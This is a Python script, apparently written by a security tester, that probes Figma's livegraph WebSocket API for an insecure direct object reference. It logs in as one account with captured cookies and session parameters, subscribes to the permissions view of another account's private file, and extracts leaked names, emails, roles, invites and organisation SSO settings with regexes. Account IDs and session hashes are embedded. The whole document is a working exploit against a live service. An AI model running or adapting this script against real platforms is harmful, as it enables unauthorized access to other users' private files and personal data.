"""登录态 IDOR 测试(新 cookie):
1. B 登录 → B 私有文件(自身对照,同时验证 authSuccess userId)
2. B 登录 → A 私有文件 FilePermissionsV2 ⭐核心 IDOR
3. A 登录 → A 私有文件(正向对照)
4. A 登录 → B 私有文件(反向 IDOR)
URL 参数直接取自用户新抓的 curl(A/B 各自 pr/pt/ph/userId/anonUserId)"""
import sys, json, asyncio, re
import websockets
sys.stdout.reconfigure(encoding="utf-8", errors="replace")

CAT = json.load(open('lg_views_catalog.json', encoding='utf-8'))
A_PRIV = "qzDqStIDJyGbthpKiuvfwg"
B_PRIV = "aJ7MyOcCcwkIcoRzlMDEmH"
A_TEAM = "1666382706663462213"
B_TEAM = "1667396394890946753"
A_UID = "1666382703778278399"
B_UID = "1667396392129259941"
A_ANON = "56401473-ed5d-4c6f-b6e4-a5378855aebf"
B_ANON = "e101e166-c8ed-43ac-bb3e-89903f418397"
COMMIT = "aeddb9472f99bd8829192d4263f27d7a6d5cef8e"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36"
CK_A = open('ws_cookie_A_new.txt', encoding='utf-8').read().strip()
CK_B = open('ws_cookie_B_new.txt', encoding='utf-8').read().strip()

def lg_url(pr, pt, ph, uid, anon, client_url):
    return (f"wss://www.figma.com/api/livegraph?pv=1&pr={pr}&pt={pt}"
            f"&ph={ph}&userId={uid}&anonUserId={anon}"
            f"&clientType=web&commitHash={COMMIT}"
            f"&preload=%7B%7D&requestedProtocolVersion=2"
            f"&clientUrl=https%3A%2F%2Fwww.figma.com%2Ffile%2F{client_url}"
            f"&connectionType=initial&reconnect=0")

def auth(uid, anon, client_url):
    return {"messageType": "auth", "clientType": "web",
            "args": {"userId": uid, "anonymousUserId": anon},
            "tags": {"clientType": "web", "commitHash": COMMIT,
                     "clientUrl": f"https://www.figma.com/file/{client_url}"},
            "clientRequestedVersion": 2}

async def collect(label, cfg, args, client_url, wait=10):
    """cfg: dict(pr, pt, ph, uid, anon, cookie)"""
    frames = []
    auth_user = "?"
    try:
        async with websockets.connect(lg_url(cfg["pr"], cfg["pt"], cfg["ph"], cfg["uid"], cfg["anon"], client_url),
                                      additional_headers={"User-Agent": UA, "Cookie": cfg["cookie"],
                                                          "Origin": "https://www.figma.com"},
                                      max_size=50_000_000, open_timeout=15) as ws:
            await ws.send(json.dumps(auth(cfg["uid"], cfg["anon"], client_url)))
            for _ in range(4):
                msg = await asyncio.wait_for(ws.recv(), timeout=8)
                if isinstance(msg, str) and "authSuccess" in msg:
                    m = re.search(r'"userId":("?\d+"?|null)', msg)
                    auth_user = m.group(1) if m else "?"
                    break
            await ws.send(json.dumps({"messageType": "subscribe", "viewName": "FilePermissionsV2",
                                      "viewHash": CAT["FilePermissionsV2"]["hash"],
                                      "loadType": "initial", "args": args}))
            deadline = asyncio.get_event_loop().time() + wait
            while asyncio.get_event_loop().time() < deadline:
                try:
                    msg = await asyncio.wait_for(ws.recv(), timeout=3)
                    if isinstance(msg, str) and "denormalizedPendingMutations" in msg:
                        frames.append(msg)
                except asyncio.TimeoutError:
                    break
    except Exception as e:
        print(f"[{label}] ❌ {type(e).__name__}: {str(e)[:90]}")
        return frames, auth_user
    return frames, auth_user

def analyze(label, frames, auth_user):
    print(f"\n===== {label} =====")
    print(f"  authSuccess userId = {auth_user}")
    if not frames:
        print("  ❌ 空(无数据)")
        return
    names = set()
    emails = set()
    roles = set()
    invites = set()
    orgs = set()
    for f in frames:
        for m in re.finditer(r'"name":"([^"]{2,40})"', f):
            names.add(m.group(1))
        for m in re.finditer(r'"email":"([^"]{3,60})"', f):
            emails.add(m.group(1))
        for m in re.finditer(r'"level":(\d+)[^}]{0,120}?"userId":"(\d+)"', f):
            roles.add(f"level={m.group(1)} userId={m.group(2)}")
        for m in re.finditer(r'"inviteeUserId":"(\d+)"[^}]{0,150}?"roleId":"(\d+)"', f):
            invites.add(f"invitee={m.group(1)} role={m.group(2)}")
        for m in re.finditer(r'"domain":"([^"]+)"[^}]{0,200}?"samlSsoOnlyAt":([^,}]{0,20})', f):
            orgs.add(f"domain={m.group(1)} samlSsoOnlyAt={m.group(2)}")
    total = sum(len(f) for f in frames)
    print(f"  帧数 {len(frames)},总 {total}B")
    print(f"  泄露姓名({len(names)}): {sorted(names)[:12]}")
    print(f"  邮箱({len(emails)}): {sorted(emails)[:8]}")
    print(f"  文件角色: {sorted(roles)[:8]}")
    print(f"  邀请记录: {sorted(invites)[:8]}")
    print(f"  Org域名/SSO: {sorted(orgs)[:5]}")
    for f in frames:
        for kw in ["PlanSubscription", "OrgDomain", "Invite", "GuestOrgUser", "FileRole"]:
            if f'" {kw}"' in f or f'"{kw}"' in f:
                print(f"  含 {kw} ✓")
                break

async def main():
    cfg_a = {"pr": "d1b918e253462531", "pt": "1786432511", "ph": "CsDKooDYsB-U9OcfxQReT-QaVh3OzV1kcDsQLjOFvzc",
             "uid": A_UID, "anon": A_ANON, "cookie": CK_A}
    cfg_b = {"pr": "dad80c10603319f8", "pt": "1786432687", "ph": "dnoflh97wkg6_cF_nypMbd9rtfZmF2KhdefK4gshdaM",
             "uid": B_UID, "anon": B_ANON, "cookie": CK_B}

    # 1. B → B 私有(自身对照 + 有效性)
    f, au = await collect("B→B私有(对照)", cfg_b, {"fileKey": B_PRIV, "teamId": B_TEAM, "currentOrgId": None}, B_PRIV)
    analyze("B→B私有(对照)", f, au)
    # 2. B → A 私有 ⭐ 核心 IDOR
    f, au = await collect("B→A私有 ⭐IDOR", cfg_b, {"fileKey": A_PRIV, "teamId": None, "currentOrgId": None}, A_PRIV)
    analyze("B→A私有 ⭐IDOR", f, au)
    # 3. A → A 私有(正向对照)
    f, au = await collect("A→A私有(对照)", cfg_a, {"fileKey": A_PRIV, "teamId": A_TEAM, "currentOrgId": None}, A_PRIV)
    analyze("A→A私有(对照)", f, au)
    # 4. A → B 私有(反向 IDOR)
    f, au = await collect("A→B私有 ⭐IDOR", cfg_a, {"fileKey": B_PRIV, "teamId": None, "currentOrgId": None}, B_PRIV)
    analyze("A→B私有 ⭐IDOR", f, au)

asyncio.run(main())
